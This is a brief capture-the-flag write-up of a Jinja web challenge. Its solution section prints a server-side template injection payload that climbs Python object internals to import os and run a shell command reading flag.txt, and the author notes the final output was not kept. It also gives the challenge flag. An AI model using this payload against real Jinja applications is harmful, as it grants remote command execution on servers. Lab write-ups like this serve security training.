# Challenge Name

Northpole Mainframe Flag (historical note)

# Author

Not recorded in the surviving notes.

# Description

The original notes describe a North Pole mainframe web challenge with two parts: a first answer obtainable from information supplied by the challenge and a later stage involving template injection. The exact original challenge card is not preserved.

# Solution

I don't have the full original chat for this challenge, so this writeup is mostly from my 2025 notes.

The first flag was pretty much given by the challenge information, and that's the one I recorded below.

My notes also include a second stage involving **server-side template injection (SSTI)** in Jinja. The idea was to use Python objects available inside the template to reach built-in functions and run a command that reads `flag.txt`.

This is the payload I had saved:

```jinja2
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat flag.txt").read()}}{%endif%}{% endfor %}
```

I don't have the final output for that second part anymore, so I won't say it worked. Also, this is **not** the same challenge as `Mainframe Upgraded?`, which used EJS and Node.js instead of Jinja.

# Flag

```text
YBN25{7h3_l1nk_wa5_n0t_mean7_t0_b3_pub1ic}
```

# Solved By

Kazikiri
